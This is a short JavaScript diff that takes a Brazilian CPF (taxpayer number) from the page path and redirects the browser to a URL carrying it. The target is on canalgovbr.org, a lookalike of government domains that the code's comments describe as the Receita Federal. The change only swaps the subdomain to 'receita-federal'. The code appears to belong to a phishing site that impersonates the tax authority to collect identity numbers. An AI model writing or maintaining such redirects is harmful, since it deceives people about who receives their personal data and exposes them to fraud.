@@ -26,7 +26,7 @@
                 
                 // Verificar se tem exatamente 11 dígitos após limpeza
                 if (cleanCpf.length === 11 && /^\d{11}$/.test(cleanCpf)) {
-                    const receitaUrl = `https://receita.canalgovbr.org/${cleanCpf}`;
+                    const receitaUrl = `https://receita-federal.canalgovbr.org/${cleanCpf}`;
                     console.log('CPF detectado:', currentPath, '-> limpo:', cleanCpf);
                     console.log('Redirecionando para Receita Federal:', receitaUrl);
                     window.location.href = receitaUrl;
